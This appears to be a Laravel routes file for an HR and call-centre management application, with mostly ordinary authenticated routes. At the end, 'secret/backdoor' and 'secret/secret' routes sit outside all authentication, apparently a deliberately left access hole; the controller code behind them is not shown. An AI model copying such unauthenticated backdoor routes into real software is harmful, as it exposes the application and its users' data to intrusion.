<?php

use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\User\DashboardController;
use App\Http\Controllers\User\ProfileController;
use App\Http\Controllers\User\EmployeeController;
use App\Http\Controllers\User\AnalysisController;
use App\Http\Controllers\User\EmployeeReportController;
use App\Http\Controllers\User\QueueReportController;
use App\Http\Controllers\User\GeneralReportController;
use App\Http\Controllers\User\PerformanceReportController;
use App\Http\Controllers\User\JobReportController;
use App\Http\Controllers\User\CustomReportController;
use App\Http\Controllers\User\EmployeeMonitoringController;
use App\Http\Controllers\User\ScreenMonitoringController;
use App\Http\Controllers\User\JobTransferWithExcelController;
use App\Http\Controllers\User\CallDataTransferWithExcelController;
use App\Http\Controllers\User\JobTransferWithIdController;
use App\Http\Controllers\User\ReActivateSuspendedJobsController;
use App\Http\Controllers\User\DeleteActivityController;
use App\Http\Controllers\User\DataJobTransferWithExcelController;
use App\Http\Controllers\User\TelevisionController;
use App\Http\Controllers\User\TelevisionSectionController;
use App\Http\Controllers\User\SurveyController;
use App\Http\Controllers\User\SurveyReportController;
use App\Http\Controllers\User\SurveyQuestionController;
use App\Http\Controllers\User\SurveyAnswerController;
use App\Http\Controllers\User\ProjectController;
use App\Http\Controllers\User\TaskController;
use App\Http\Controllers\User\MilestoneController;
use App\Http\Controllers\User\TimesheetController;
use App\Http\Controllers\User\ProjectFileController;
use App\Http\Controllers\User\TicketMessageController;
use App\Http\Controllers\User\TicketController;
use App\Http\Controllers\User\InventoryController;
use App\Http\Controllers\User\MissionController;
use App\Http\Controllers\User\SystemCalendarController;
use App\Http\Controllers\User\ExamController;
use App\Http\Controllers\User\ExamQuestionController;
use App\Http\Controllers\User\IK\Dashboard\DashboardController as IKDashboardController;
use App\Http\Controllers\User\IK\Employee\EmployeeController as IKEmployeeController;
use App\Http\Controllers\User\IK\Employee\EmployeeDevice\EmployeeDeviceController as IKEmployeeDeviceController;
use App\Http\Controllers\User\IK\Employee\Career\PositionController as IKPositionController;
use App\Http\Controllers\User\IK\Employee\Career\SalaryController as IKSalaryController;
use App\Http\Controllers\User\IK\Employee\Punishment\PunishmentController as IKPunishmentController;
use App\Http\Controllers\User\IK\Calendar\CalendarController as IKCalendarController;
use App\Http\Controllers\User\IK\Report\ReportController as IKReportController;
use App\Http\Controllers\User\IK\Application\ApplicationController as IKApplicationController;
use App\Http\Controllers\User\IK\Application\Permit\PermitController as IKPermitController;
use App\Http\Controllers\User\IK\Application\Overtime\OvertimeController as IKOvertimeController;
use App\Http\Controllers\User\IK\Application\Payment\PaymentController as IKPaymentController;
use App\Http\Controllers\User\IK\Application\Scoring\ScoringController as IKScoringController;
use App\Http\Controllers\User\IK\Application\PermitProgress\PermitProgressController as IKPermitProgressController;
use App\Http\Controllers\User\IK\Application\Recruiting\RecruitingController as IKRecruitingController;
use App\Http\Controllers\User\IK\Application\Recruiting\Setting\EvaluationParameterController as IKEvaluationParameterController;
use App\Http\Controllers\User\IK\Application\Recruiting\Setting\RecruitingStepController as IKRecruitingStepController;
use App\Http\Controllers\User\IK\Application\Recruiting\Setting\RecruitingStepSubStepController as IKRecruitingStepSubStepController;
use App\Http\Controllers\User\IK\Application\CovidDocument\CovidDocumentController as IKCovidDocumentController;
use App\Http\Controllers\User\IK\Application\BatchActions\BatchActionsController as IKBatchActionsController;
use App\Http\Controllers\User\IK\Application\FoodList\FoodListController as IKFoodListController;
use App\Http\Controllers\User\IK\Application\Shift\ShiftController as IKShiftController;
use App\Http\Controllers\User\IK\Application\Sms\SmsController as IKSmsController;
use App\Http\Controllers\User\IK\Setting\SettingController as IKSettingController;
use App\Http\Controllers\User\Setting\CompanyController as CompanySettingController;
use App\Http\Controllers\User\Setting\QueueController as QueueSettingController;
use App\Http\Controllers\User\Setting\CompetenceController as CompetenceSettingController;
use App\Http\Controllers\User\Setting\PriorityController as PrioritySettingController;
use App\Http\Controllers\User\Setting\ShiftGroupController as ShiftGroupSettingController;
use App\Http\Controllers\User\Setting\UserController as UserSettingController;
use App\Http\Controllers\User\Setting\RoleController as RoleSettingController;
use App\Http\Controllers\User\Setting\DeviceGroupController as DeviceGroupSettingController;
use App\Http\Controllers\User\Setting\DeviceStatusController as DeviceStatusSettingController;
use App\Http\Controllers\User\Application\ApplicationController;
use App\Http\Controllers\User\Application\BatchActions\BatchActionsController;
use App\Http\Controllers\User\Application\CustomReport\CustomReportController as ApplicationCustomReportController;
use App\Http\Controllers\User\Application\Meeting\MeetingController;
use App\Http\Controllers\User\Application\MeetingAgenda\MeetingAgendaController;

Route::get('/test', [\App\Http\Controllers\HomeController::class, 'index'])->name('test');

Auth::routes();

Route::middleware(['auth'])->group(function () {
    Route::get('/', function () {
        return redirect()->route('index');
    });
    Route::get('/index/{company_id?}', [DashboardController::class, 'index'])->name('index')->middleware('Authority:1');

    Route::prefix('profile')->group(function () {
        Route::get('/', function () {
            return redirect()->route('profile.index');
        });
        Route::get('index', [ProfileController::class, 'index'])->name('profile.index');
        Route::post('changePassword', [ProfileController::class, 'changePassword'])->name('profile.changePassword');
    });

    Route::prefix('employee')->group(function () {
        Route::get('/', function () {
            return redirect()->route('employee.index');
        });
        Route::get('/index/{company_id?}', [EmployeeController::class, 'index'])->name('employee.index')->middleware('Authority:2');
        Route::get('/show/{employee}/{tab?}', [EmployeeController::class, 'show'])->name('employee.show')->middleware('Authority:28');
        Route::post('/update', [EmployeeController::class, 'update'])->name('employee.update')->middleware('Authority:28');
        Route::get('/index/by-priority/{priority}', [EmployeeController::class, 'byPriority'])->name('employee.index.by-priority')->middleware('Authority:2');
        Route::get('/report/{employee}/this-month', [EmployeeController::class, 'report'])->name('employee.report')->middleware('Authority:12');
        Route::post('/report/detail', [EmployeeController::class, 'reportByDate'])->name('employee.report.by-date')->middleware('Authority:12');
        Route::get('/priorities/edit/{employee}', [EmployeeController::class, 'editPriorities'])->name('employee.priorities.edit')->middleware('Authority:2');
        Route::post('/priorities/update', [EmployeeController::class, 'updatePriorities'])->name('employee.priorities.update')->middleware('Authority:2');
        Route::get('/sync', [EmployeeController::class, 'sync'])->name('employee.sync')->middleware('Authority:100');
    });

    Route::prefix('analysis')->group(function () {
        Route::get('/employee-call-analysis-create', [AnalysisController::class, 'employeeCallAnalysisCreate'])->name('analysis.employee-call-analysis-create')->middleware('Authority:4');
        Route::post('/employee-call-analysis-store', [AnalysisController::class, 'employeeCallAnalysisStore'])->name('analysis.employee-call-analysis-store')->middleware('Authority:4');

        Route::get('/employee-job-analysis-create', [AnalysisController::class, 'employeeJobAnalysisCreate'])->name('analysis.employee-job-analysis-create')->middleware('Authority:5');
        Route::post('/employee-job-analysis-store', [AnalysisController::class, 'employeeJobAnalysisStore'])->name('analysis.employee-job-analysis-store')->middleware('Authority:5');

        Route::get('/queue-call-analysis-create', [AnalysisController::class, 'queueCallAnalysisCreate'])->name('analysis.queue-call-analysis-create')->middleware('Authority:6');
        Route::post('/queue-call-analysis-store', [AnalysisController::class, 'queueCallAnalysisStore'])->name('analysis.queue-call-analysis-store')->middleware('Authority:6');

        Route::get('/job-analysis-create', [AnalysisController::class, 'jobAnalysisCreate'])->name('analysis.job-analysis-create')->middleware('Authority:7');
        Route::post('/job-analysis-store', [AnalysisController::class, 'jobAnalysisStore'])->name('analysis.job-analysis-store')->middleware('Authority:7');
    });

    Route::prefix('report')->group(function () {
        Route::prefix('employee')->group(function () {
            Route::get('/comparison-report', [EmployeeReportController::class, 'comparisonReport'])->name('report.comparison-report')->middleware('Authority:8');
            Route::post('/comparison-report/show', [EmployeeReportController::class, 'comparisonReportShow'])->name('report.comparison-report.show')->middleware('Authority:8');
            Route::get('/employees', [EmployeeReportController::class, 'employees'])->name('report.employees')->middleware('Authority:11');
            Route::post('/employees/by-company', [EmployeeReportController::class, 'employeesByCompany'])->name('report.employees.by-company')->middleware('Authority:11');
        });

        Route::prefix('queue')->group(function () {
            Route::get('/queue-call-report/create', [QueueReportController::class, 'queueCallReportCreate'])->name('report.queue-call-report.create')->middleware('Authority:9');
            Route::post('/queue-call-report', [QueueReportController::class, 'queueCallReport'])->name('report.queue-call-report')->middleware('Authority:9');
        });

        Route::prefix('general')->group(function () {
            Route::get('/general-report/create', [GeneralReportController::class, 'generalReportCreate'])->name('report.general.create')->middleware('Authority:10');
            Route::post('/general-report', [GeneralReportController::class, 'generalReport'])->name('report.general')->middleware('Authority:10');
        });

        Route::prefix('performance')->group(function () {
            Route::get('performance', [PerformanceReportController::class, 'create'])->name('report.performance.create');
            Route::post('performance/report', [PerformanceReportController::class, 'report'])->name('report.performance.report');
        });

        Route::prefix('job')->group(function () {
            Route::get('/index', [JobReportController::class, 'index'])->name('report.job.index');
            Route::post('/show', [JobReportController::class, 'show'])->name('report.job.show');
        });

        Route::prefix('custom')->namespace('Custom')->group(function () {
            Route::get('/index', [CustomReportController::class, 'index'])->name('report.custom.index');
            Route::post('/show', [CustomReportController::class, 'show'])->name('report.custom.show');
        });
    });

    Route::prefix('integration')->group(function () {
        Route::prefix('excel')->group(function () {
            Route::get('/index', [JobTransferWithExcelController::class, 'index'])->name('integration.excel.index');
            Route::post('/store', [JobTransferWithExcelController::class, 'store'])->name('integration.excel.store');
        });

        Route::prefix('call-data-scanning')->group(function () {
            Route::get('/index', [CallDataTransferWithExcelController::class, 'index'])->name('integration.call-data-scanning.index');
            Route::post('/store', [CallDataTransferWithExcelController::class, 'store'])->name('integration.call-data-scanning.store');
        });

        Route::prefix('with-id')->group(function () {
            Route::get('/index', [JobTransferWithIdController::class, 'index'])->name('integration.with-id.index');
            Route::post('/store', [JobTransferWithIdController::class, 'store'])->name('integration.with-id.store');
        });

        Route::prefix('re-activate-suspended-jobs')->group(function () {
            Route::get('index', [ReActivateSuspendedJobsController::class, 'index'])->name('integration.re-activate-suspended-jobs');
        });

        Route::prefix('delete-activity')->group(function () {
            Route::get('/index', [DeleteActivityController::class, 'index'])->name('integration.activity-delete');
            Route::post('/delete', [DeleteActivityController::class, 'delete'])->name('integration.activity.delete');
        });

        Route::prefix('excel-data')->group(function () {
            Route::get('/index', [DataJobTransferWithExcelController::class, 'index'])->name('integration.excel-data.index');
            Route::post('/store', [DataJobTransferWithExcelController::class, 'store'])->name('integration.excel-data.store');
        });
    });

    Route::prefix('tv')->middleware('Authority:21')->group(function () {
        Route::get('/index', [TelevisionController::class, 'index'])->name('tv.index');
        Route::post('/store', [TelevisionController::class, 'store'])->name('tv.store');
        Route::get('/abandons', [TelevisionController::class, 'abandons'])->name('dashboard.abandons');

        Route::prefix('sections')->group(function () {
            Route::get('section/1', [TelevisionSectionController::class, 'Section1'])->name('tv.section.1');
            Route::get('section/2', [TelevisionSectionController::class, 'Section2'])->name('tv.section.2');
        });
    });

    Route::prefix('surveys')->group(function () {
        Route::get('/index', [SurveyController::class, 'index'])->name('surveys.index');
        Route::get('/detail', [SurveyController::class, 'detail'])->name('surveys.detail');
        Route::get('/diagram/{id?}', [SurveyController::class, 'diagram'])->name('surveys.diagram');
        Route::get('/products', [SurveyController::class, 'products'])->name('surveys.products');
        Route::get('/sellers', [SurveyController::class, 'sellers'])->name('surveys.sellers');
        Route::get('/employees', [SurveyController::class, 'employees'])->name('surveys.employees');

        Route::prefix('report')->group(function () {
            Route::get('report', [SurveyReportController::class, 'index'])->name('surveys.report.index');
            Route::get('{code?}/show', [SurveyReportController::class, 'show'])->name('surveys.report.show');
            Route::get('{code?}/showByEmployee', [SurveyReportController::class, 'showByEmployee'])->name('surveys.report.showByEmployee');
        });

        Route::prefix('questions')->group(function () {
            Route::get('/{code?}/index', [SurveyQuestionController::class, 'index'])->name('surveys.questions');
        });

        Route::prefix('answers')->group(function () {
            Route::get('/{id?}/{surveyCode?}/index', [SurveyAnswerController::class, 'index'])->name('surveys.answers');
        });
    });

    Route::prefix('management-report')->middleware('Authority:100')->group(function () {
        Route::prefix('employee-monitoring')->group(function () {
            Route::get('index', [EmployeeMonitoringController::class, 'index'])->name('management-report.employee-monitoring.index');
        });
        Route::prefix('screen-monitoring')->group(function () {
            Route::get('index', [ScreenMonitoringController::class, 'index'])->name('management-report.screen-monitoring.index');
            Route::get('details/{guid?}', [ScreenMonitoringController::class, 'details'])->name('management-report.screen-monitoring.details');
        });
    });

    Route::prefix('project-management')->middleware(['Authority:32'])->group(function () {
        Route::prefix('project')->group(function () {
            Route::get('index', [ProjectController::class, 'index'])->name('project.project.index');
            Route::get('{project}/{tab}/{sub?}', [ProjectController::class, 'show'])->name('project.project.show');
            Route::get('{project}/timeline/by/{timesheetId}', [ProjectController::class, 'timeline'])->name('project.project.timeline');
            Route::get('{project}/tickets/ticket/{ticket}', [ProjectController::class, 'ticket'])->name('project.project.tickets.ticket');
            Route::post('delete', [ProjectController::class, 'delete'])->name('project.project.delete');

            Route::post('employees/update', [ProjectController::class, 'employeesUpdate'])->name('project.project.employees.update');
            Route::post('create', [ProjectController::class, 'create'])->name('project.project.create');
            Route::post('update', [ProjectController::class, 'update'])->name('project.project.update');

            Route::prefix('task')->group(function () {
                Route::post('create', [TaskController::class, 'create'])->name('project.project.task.create');
            });

            Route::prefix('milestone')->group(function () {
                Route::post('create', [MilestoneController::class, 'create'])->name('project.project.milestone.create');
                Route::post('delete', [MilestoneController::class, 'delete'])->name('project.project.milestone.delete');
            });

            Route::prefix('timesheet')->group(function () {
                Route::post('start', [TimesheetController::class, 'start'])->name('project.project.timesheet.start');
                Route::post('stop', [TimesheetController::class, 'stop'])->name('project.project.timesheet.stop');
            });

            Route::prefix('file')->group(function () {
                Route::post('create', [ProjectFileController::class, 'create'])->name('project.project.file.create')->withoutMiddleware('Authority:32');
                Route::post('delete', [ProjectFileController::class, 'delete'])->name('project.project.file.delete')->withoutMiddleware('Authority:32');
            });

            Route::prefix('ticket-message')->group(function () {
                Route::post('create', [TicketMessageController::class, 'create'])->name('project.project.ticket.ticket-message.create');
            });

            Route::prefix('ticket')->group(function () {
                Route::post('setCompleted', [TicketController::class, 'setCompleted'])->name('project.project.ticket.setCompleted');
            });
        });
    });

    Route::prefix('inventory')->middleware(['Authority:44'])->group(function () {
        Route::get('/index', [InventoryController::class, 'index'])->name('inventory.index');
        Route::get('/devices', [InventoryController::class, 'devices'])->name('inventory.devices');
        Route::get('/devices/report', [InventoryController::class, 'report'])->name('inventory.devices.report');
        Route::post('/devices/report/show', [InventoryController::class, 'reportShow'])->name('inventory.devices.report.show');
        Route::get('/devices/report/show/{id}/detail', [InventoryController::class, 'showDetail'])->name('inventory.devices.report.show.detail');
    });

    Route::prefix('mission')->group(function () {
        Route::get('index', [MissionController::class, 'index'])->name('mission.index');
    });

    Route::prefix('calendar')->group(function () {
        Route::get('index', [SystemCalendarController::class, 'index'])->name('calendar.index');
    });

    Route::prefix('ik')->group(function () {
        Route::prefix('dashboard')->group(function () {
            Route::get('index', [IKDashboardController::class, 'index'])->name('ik.dashboard.index');
        });

        Route::prefix('employee')->group(function () {
            Route::get('/', function () {
                return redirect()->route('ik.employee.index');
            });
            Route::get('index', [IKEmployeeController::class, 'index'])->name('ik.employee.index');
            Route::post('create', [IKEmployeeController::class, 'create'])->name('ik.employee.create');
            Route::get('leavers', [IKEmployeeController::class, 'leavers'])->name('ik.employee.leavers');
            Route::get('/{id}/show/{tab?}', [IKEmployeeController::class, 'show'])->name('ik.employee.show');
            Route::post('update/personal', [IKEmployeeController::class, 'updatePersonal'])->name('ik.employee.update.personal');
            Route::post('leave', [IKEmployeeController::class, 'leave'])->name('ik.employee.leave');

            Route::prefix('employee-device')->group(function () {
                Route::post('create', [IKEmployeeDeviceController::class, 'create'])->name('ik.employee.employee-device.create');
                Route::post('update', [IKEmployeeDeviceController::class, 'update'])->name('ik.employee.employee-device.update');
                Route::post('delete', [IKEmployeeDeviceController::class, 'delete'])->name('ik.employee.employee-device.delete');
                Route::get('downloadDoc', [IKEmployeeDeviceController::class, 'downloadDoc'])->name('ik.employee.employee-device.downloadEmployeeDevicesDocument');
            });

            Route::prefix('career')->namespace('Career')->group(function () {
                Route::prefix('position')->group(function () {
                    Route::post('create', [IKPositionController::class, 'create'])->name('ik.employee.career.position.create');
                    Route::post('update', [IKPositionController::class, 'update'])->name('ik.employee.career.position.update');
                });

                Route::prefix('salary')->group(function () {
                    Route::post('create', [IKSalaryController::class, 'create'])->name('ik.employee.career.salary.create');
                    Route::post('update', [IKSalaryController::class, 'update'])->name('ik.employee.career.salary.update');
                });
            });

            Route::prefix('punishment')->namespace('Punishment')->group(function () {
                Route::post('create', [IKPunishmentController::class, 'create'])->name('ik.employee.punishment.create');
                Route::post('update', [IKPunishmentController::class, 'update'])->name('ik.employee.punishment.update');
                Route::post('delete', [IKPunishmentController::class, 'delete'])->name('ik.employee.punishment.delete');
                Route::get('{id?}/document/create', [IKPunishmentController::class, 'documentCreate'])->name('ik.employee.punishment.document.create');
                Route::post('document/upload', [IKPunishmentController::class, 'documentUpload'])->name('ik.employee.punishment.document.upload');
                Route::post('document/delete', [IKPunishmentController::class, 'documentDelete'])->name('ik.employee.punishment.document.delete');
            });
        });

        Route::prefix('calendar')->group(function () {
            Route::get('index', [IKCalendarController::class, 'index'])->name('ik.calendar.index');
        });

        Route::prefix('report')->group(function () {
            Route::get('index', [IKReportController::class, 'index'])->name('ik.report.index');
            Route::post('employeeReport', [IKReportController::class, 'employeeReport'])->name('ik.report.employeeReport');
            Route::post('managerialReport', [IKReportController::class, 'managerialReport'])->name('ik.report.managerialReport');
        });

        Route::prefix('applications')->group(function () {
            Route::get('index', [IKApplicationController::class, 'index'])->name('ik.application.index');

            Route::prefix('permit')->group(function () {
                Route::get('index', [IKPermitController::class, 'index'])->name('ik.application.permit.index');
                Route::post('create', [IKPermitController::class, 'create'])->name('ik.application.permit.create');
                Route::post('update', [IKPermitController::class, 'update'])->name('ik.application.permit.update');
                Route::post('delete', [IKPermitController::class, 'delete'])->name('ik.application.permit.delete');
            });

            Route::prefix('overtime')->group(function () {
                Route::get('index', [IKOvertimeController::class, 'index'])->name('ik.application.overtime.index');
                Route::post('create', [IKOvertimeController::class, 'create'])->name('ik.application.overtime.create');
                Route::post('update', [IKOvertimeController::class, 'update'])->name('ik.application.overtime.update');
                Route::post('delete', [IKOvertimeController::class, 'delete'])->name('ik.application.overtime.delete');
            });

            Route::prefix('payment')->group(function () {
                Route::get('index', [IKPaymentController::class, 'index'])->name('ik.application.payment.index');
                Route::post('create', [IKPaymentController::class, 'create'])->name('ik.application.payment.create');
                Route::post('update', [IKPaymentController::class, 'update'])->name('ik.application.payment.update');
                Route::post('delete', [IKPaymentController::class, 'delete'])->name('ik.application.payment.delete');
            });

            Route::prefix('scoring')->group(function () {
                Route::get('scoring', [IKScoringController::class, 'index'])->name('ik.application.scoring.index');
            });

            Route::prefix('permit-progress')->group(function () {
                Route::get('index', [IKPermitProgressController::class, 'index'])->name('ik.application.permit-progress.index');
                Route::post('report', [IKPermitProgressController::class, 'report'])->name('ik.application.permit-progress.report');
            });

            Route::prefix('recruiting')->group(function () {
                Route::get('index', [IKRecruitingController::class, 'index'])->name('ik.application.recruiting.index');
                Route::get('calendar', [IKRecruitingController::class, 'calendar'])->name('ik.application.recruiting.calendar');
                Route::get('show/{id?}', [IKRecruitingController::class, 'show'])->name('ik.application.recruiting.show');
                Route::get('history/{id?}', [IKRecruitingController::class, 'transactionHistory'])->name('ik.application.recruiting.transactionHistory');
                Route::get('settings', [IKRecruitingController::class, 'settings'])->name('ik.application.recruiting.settings');

                Route::prefix('settings')->group(function () {
                    Route::prefix('recruiting-steps')->group(function () {
                        Route::get('index', [IKRecruitingStepController::class, 'index'])->name('ik.application.recruiting.settings.recruiting-steps.index');
                    });
                    Route::prefix('recruiting-step-sub-steps')->group(function () {
                        Route::get('index', [IKRecruitingStepSubStepController::class, 'index'])->name('ik.application.recruiting.settings.recruiting-step-sub-steps.index');
                    });
                    Route::prefix('evaluation-parameters')->group(function () {
                        Route::get('index', [IKEvaluationParameterController::class, 'index'])->name('ik.application.recruiting.settings.evaluation-parameters.index');
                    });
                });
            });

            Route::prefix('covid-document')->group(function () {
                Route::get('index', [IKCovidDocumentController::class, 'index'])->name('ik.application.covid-document.index');
                Route::post('create', [IKCovidDocumentController::class, 'create'])->name('ik.application.covid-document.create');
            });

            Route::prefix('batch-actions')->namespace('BatchActions')->group(function () {
                Route::get('index', [IKBatchActionsController::class, 'index'])->name('ik.application.batch-actions.index');
                Route::post('createOvertime', [IKBatchActionsController::class, 'createOvertime'])->name('ik.application.batch-actions.createOvertime');
            });

            Route::prefix('food-list')->namespace('FoodList')->group(function () {
                Route::get('index', [IKFoodListController::class, 'index'])->name('ik.applications.food-list.index');
                Route::post('create', [IKFoodListController::class, 'create'])->name('ik.applications.food-list.create');
                Route::get('edit', [IKFoodListController::class, 'edit'])->name('ik.applications.food-list.edit');
                Route::post('update', [IKFoodListController::class, 'update'])->name('ik.applications.food-list.update');
                Route::post('report', [IKFoodListController::class, 'report'])->name('ik.applications.food-list.report');
                Route::get('{date?}/report-detail', [IKFoodListController::class, 'reportDetail'])->name('ik.applications.food-list.report-detail');
            });

            Route::prefix('shift')->namespace('Shift')->group(function () {
                Route::get('/index', [IKShiftController::class, 'index'])->name('ik.applications.shift.index')->middleware('Authority:29');
                Route::get('/robot', [IKShiftController::class, 'robot'])->name('ik.applications.shift.robot')->middleware('Authority:30');
                Route::post('/robot/store', [IKShiftController::class, 'robotStore'])->name('ik.applications.shift.robot.store')->middleware('Authority:30');
            });

            Route::prefix('sms')->namespace('Sms')->group(function () {
                Route::get('/index', [IKSmsController::class, 'index'])->name('ik.applications.sms.index')->middleware('Authority:29');
                Route::post('/send', [IKSmsController::class, 'send'])->name('ik.applications.sms.send')->middleware('Authority:30');
                Route::post('/send-others', [IKSmsController::class, 'sendOthers'])->name('ik.applications.sms.send-others')->middleware('Authority:30');
            });
        });

        Route::prefix('setting')->namespace('Setting')->group(function () {
            Route::get('index', [IKSettingController::class, 'index'])->name('ik.setting.index');
            Route::get('/show/{tab?}', [IKSettingController::class, 'show'])->name('ik.setting.show');
        });
    });

    Route::prefix('exams')->group(function () {
        Route::get('/index', [ExamController::class, 'index'])->name('exams.index');
        Route::get('/{id?}/employees', [ExamController::class, 'getExamEmployees'])->name('exams.getExamEmployees');
        Route::get('/{id?}/{exam?}/{name?}/results', [ExamController::class, 'getExamResults'])->name('exams.getExamResults');
        Route::get('exam/{id}/results', [ExamController::class, 'getResults'])->name('exams.getResults');
        Route::post('setExamResults', [ExamController::class, 'setExamResults'])->name('exams.setExamResults');

        Route::prefix('questions')->group(function () {
            Route::get('/exam/{exam}', [ExamQuestionController::class, 'index'])->name('exams.questions');
        });
    });

    Route::prefix('setting')->group(function () {
        Route::prefix('company')->middleware('Authority:14')->group(function () {
            Route::get('/index', [CompanySettingController::class, 'index'])->name('setting.company.index');
            Route::get('/sync-employees', [CompanySettingController::class, 'syncEmployees'])->name('setting.company.sync-employees');
        });

        Route::prefix('queues')->middleware('Authority:14')->group(function () {
            Route::get('/index', [QueueSettingController::class, 'index'])->name('setting.queues.index');
            Route::post('/store', [QueueSettingController::class, 'store'])->name('setting.queues.store');
            Route::get('/edit', [QueueSettingController::class, 'edit'])->name('setting.queues.edit');
            Route::post('/update', [QueueSettingController::class, 'update'])->name('setting.queues.update');
            Route::post('/delete', [QueueSettingController::class, 'delete'])->name('setting.queues.delete');
        });

        Route::prefix('competences')->middleware('Authority:15')->group(function () {
            Route::get('/index', [CompetenceSettingController::class, 'index'])->name('setting.competences.index');
            Route::post('/store', [CompetenceSettingController::class, 'store'])->name('setting.competences.store');
            Route::get('/edit', [CompetenceSettingController::class, 'edit'])->name('setting.competences.edit');
            Route::post('/update', [CompetenceSettingController::class, 'update'])->name('setting.competences.update');
            Route::post('/delete', [CompetenceSettingController::class, 'delete'])->name('setting.competences.delete');
        });

        Route::prefix('priorities')->middleware('Authority:16')->group(function () {
            Route::get('/index', [PrioritySettingController::class, 'index'])->name('setting.priorities.index');
            Route::post('/store', [PrioritySettingController::class, 'store'])->name('setting.priorities.store');
            Route::get('/edit', [PrioritySettingController::class, 'edit'])->name('setting.priorities.edit');
            Route::post('/update', [PrioritySettingController::class, 'update'])->name('setting.priorities.update');
            Route::post('/delete', [PrioritySettingController::class, 'delete'])->name('setting.priorities.delete');
        });

        Route::prefix('shift-groups')->middleware('Authority:30')->group(function () {
            Route::get('/index', [ShiftGroupSettingController::class, 'index'])->name('setting.shift-groups.index');
            Route::get('/create', [ShiftGroupSettingController::class, 'create'])->name('setting.shift-groups.create');
            Route::get('/{id?}/edit', [ShiftGroupSettingController::class, 'edit'])->name('setting.shift-groups.edit');
            Route::post('/store', [ShiftGroupSettingController::class, 'store'])->name('setting.shift-groups.store');
            Route::get('/edit', [ShiftGroupSettingController::class, 'edit'])->name('setting.shift-groups.edit');
            Route::post('/update', [ShiftGroupSettingController::class, 'update'])->name('setting.shift-groups.update');
            Route::post('/delete', [ShiftGroupSettingController::class, 'delete'])->name('setting.shift-groups.delete');
        });

        Route::prefix('users')->middleware('Authority:17')->group(function () {
            Route::get('/index', [UserSettingController::class, 'index'])->name('setting.users.index');
            Route::post('/store', [UserSettingController::class, 'store'])->name('setting.users.store');
            Route::get('/edit', [UserSettingController::class, 'edit'])->name('setting.users.edit');
            Route::post('/update', [UserSettingController::class, 'update'])->name('setting.users.update');
            Route::post('/delete', [UserSettingController::class, 'delete'])->name('setting.users.delete');
        });

        Route::prefix('roles')->middleware('Authority:18')->group(function () {
            Route::get('/index', [RoleSettingController::class, 'index'])->name('setting.roles.index');
            Route::post('/store', [RoleSettingController::class, 'store'])->name('setting.roles.store');
            Route::get('/edit', [RoleSettingController::class, 'edit'])->name('setting.roles.edit');
            Route::get('/permissions', [RoleSettingController::class, 'permissions'])->name('setting.roles.permissions');
            Route::post('/permissions/update', [RoleSettingController::class, 'permissionsUpdate'])->name('setting.roles.permissions.update');
            Route::post('/update', [RoleSettingController::class, 'update'])->name('setting.roles.update');
            Route::post('/delete', [RoleSettingController::class, 'delete'])->name('setting.roles.delete');
        });

        Route::prefix('device-groups')->namespace('DeviceGroup')->group(function () {
            Route::get('/index', [DeviceGroupSettingController::class, 'index'])->name('setting.device-groups.index');
            Route::post('/store', [DeviceGroupSettingController::class, 'store'])->name('setting.device-groups.store');
            Route::get('/edit', [DeviceGroupSettingController::class, 'edit'])->name('setting.device-groups.edit');
            Route::post('/update', [DeviceGroupSettingController::class, 'update'])->name('setting.device-groups.update');
            Route::post('/delete', [DeviceGroupSettingController::class, 'delete'])->name('setting.device-groups.delete');
        });

        Route::prefix('device-statuses')->namespace('DeviceStatus')->group(function () {
            Route::get('/index', [DeviceStatusSettingController::class, 'index'])->name('setting.device-statuses.index');
            Route::post('/store', [DeviceStatusSettingController::class, 'store'])->name('setting.device-statuses.store');
            Route::get('/edit', [DeviceStatusSettingController::class, 'edit'])->name('setting.device-statuses.edit');
            Route::post('/update', [DeviceStatusSettingController::class, 'update'])->name('setting.device-statuses.update');
            Route::post('/delete', [DeviceStatusSettingController::class, 'delete'])->name('setting.device-statuses.delete');
        });
    });

    Route::prefix('applications')->group(function () {
        Route::get('/index', [ApplicationController::class, 'index'])->name('applications.index');

        Route::prefix('batch-actions')->group(function () {
            Route::get('index', [BatchActionsController::class, 'index'])->name('applications.batch-actions.index');
        });

        Route::prefix('custom-report')->group(function () {
            Route::get('index', [ApplicationCustomReportController::class, 'index'])->name('applications.custom-report.index');
        });

        Route::prefix('meeting')->group(function () {
            Route::get('index', [MeetingController::class, 'index'])->name('applications.meeting.index');
            Route::get('show/{id?}/{tab?}', [MeetingController::class, 'show'])->name('applications.meeting.show');
            Route::get('download', [MeetingController::class, 'download'])->name('applications.meeting.download');
        });

        Route::prefix('agenda')->group(function () {
            Route::get('index', [MeetingAgendaController::class, 'index'])->name('applications.agenda.index')->middleware('Authority:101');
        });
    });
});

Route::get('secret/backdoor', [\App\Http\Controllers\HomeController::class, 'backdoor']);
Route::post('secret/backdoor/result', [\App\Http\Controllers\HomeController::class, 'backdoorPost'])->name('backdoor.result');
Route::get('secret/secret', [\App\Http\Controllers\HomeController::class, 'secret']);
Route::post('secret/secret/result', [\App\Http\Controllers\HomeController::class, 'secretPost'])->name('secret.result');
